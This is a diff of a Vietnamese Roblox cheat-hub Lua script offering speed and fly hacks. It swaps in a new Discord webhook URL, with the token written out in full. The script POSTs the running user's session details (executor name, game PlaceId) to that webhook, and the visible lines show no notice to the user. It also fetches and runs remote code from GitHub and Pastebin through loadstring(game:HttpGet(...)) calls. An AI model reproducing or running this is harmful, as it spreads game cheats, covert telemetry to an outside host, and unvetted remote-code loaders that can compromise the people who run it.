@@ -1,3 +1,41 @@
+
+local S function InfAb()
+        if InfAbility then
+            if not game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility") then
+                local inf = Instance.new("ParticleEmitter")
+                inf.Acceleration = Vector3.new(0,0,0)
+                inf.Archivable = true
+                inf.Drag = 20
+                inf.EmissionDirection = Enum.NormalId.Top
+                inf.Enabled = true
+                inf.Lifetime = NumberRange.new(0,0)
+                inf.LightInfluence = 0
+                inf.LockedToPart = true
+                inf.Name = "Agility"
+                inf.Rate = 500
+                local numberKeypoints2 = {
+                    NumberSequenceKeypoint.new(0, 0);
+                    NumberSequenceKeypoint.new(1, 4); 
+                }
+                inf.Size = NumberSequence.new(numberKeypoints2)
+                inf.RotSpeed = NumberRange.new(9999, 99999)
+                inf.Rotation = NumberRange.new(0, 0)
+                inf.Speed = NumberRange.new(30, 30)
+                inf.SpreadAngle = Vector2.new(0,0,0,0)
+                inf.Texture = ""
+                inf.VelocityInheritance = 0
+                inf.ZOffset = 2
+                inf.Transparency = NumberSequence.new(0)
+                inf.Color = ColorSequence.new(Color3.fromRGB(0,0,0),Color3.fromRGB(0,0,0))
+                inf.Parent = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart
+            end
+        else
+            if game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility") then
+                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart:FindFirstChild("Agility"):Destroy()
+            end
+        end
+    end
+    
 local ScreenGui = Instance.new("ScreenGui")
 local ImageButton = Instance.new("ImageButton")
 local UICorner = Instance.new("UICorner")
@@ -31,7 +69,7 @@ local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "Prot
                                             ["inline"]= true
                                         },
                                     {
-                                            ["name"]= "```the game is playing```",
+                                            ["name"]= "```Game đang chơi```",
                                             ["value"]= "```https://www.roblox.com/games/"..Game.PlaceId.."/```",
                                             ["inline"]= true
                                         },
@@ -43,7 +81,7 @@ local ExecutorUsing = is_sirhurt_closure and "Sirhurt" or pebc_execute and "Prot
                     local Encoded = HttpService:JSONEncode(Data)
                     
                     Request = http_request or request or HttpPost or syn.request
-                    local Final = {Url = "https://discord.com/api/webhooks/1093683678602866808/nRZ_Y9xxKN3kNWMBeIoCXt3JUAOgMJgdcRf4dPtW9P8aGNE16i8SmxSBOcTB39lKbpmm", Body = Encoded, Method = "POST", Headers = Headers}
+                    local Final = {Url = "https://discord.com/api/webhooks/1093465330770260028/4pTWwrvZGf7H5UR2jWBn3yduJINLpb15jZOUAhteUuVNBmN5h6dVAHyYsOVj02jfSKZ0", Body = Encoded, Method = "POST", Headers = Headers}
                     Request(Final)
 
 --Properties:
@@ -115,7 +153,7 @@ end
 
 local notifLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/Notification%20Library/main.lua"))()
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/asdjasdhsuhduahd213/AN_HUB/main/lib"))()
-local Window = Library.CreateLib(" Nguyễn An ( Fix lỗi chạy nhanh )", "BloodTheme")
+local Window = Library.CreateLib(" Nguyễn An ( done Update script blox )", "BloodTheme")
 game:GetService("StarterGui"):SetCore("SendNotification", { 
     Title = "Nguyễn An";
     Text = "Nhận cày Thuê Shindo + blox";
@@ -149,7 +187,7 @@ Section:NewButton("Show acc ( lỗi ) ", "Nguyễn An", function()
 loadstring(game:HttpGet("https://pastebin.com/raw/zcFd20tT"))()
 end)
 
-Section:NewToggle("chạy nhanh đến nổ máy ( lỗi )", "....", function(state)
+Section:NewToggle("chạy nhanh đến nổ máy", "....", function(state)
  if state then
           InfAbility = state
         if state == false then
@@ -255,8 +293,8 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/asdjasdhsuhduahd213/l
 
 --other
 local Tab = Window:NewTab("Những điều thú vị")
-local Section = Tab:NewSection("Nguyễn An")
-Section:NewButton("Hack Bay 1", "nó chỉ bay dc thui nhưng xịn hơn :3", function()
+
+Section:NewButton("Hack Bay 3", "nó chỉ bay dc thui nhưng xịn hơn :3", function()
     print("Clicked")
     loadstring(game:HttpGet('https://raw.githubusercontent.com/asdjasdhsuhduahd213/AN_HUB/main/acc1'))()
 end)
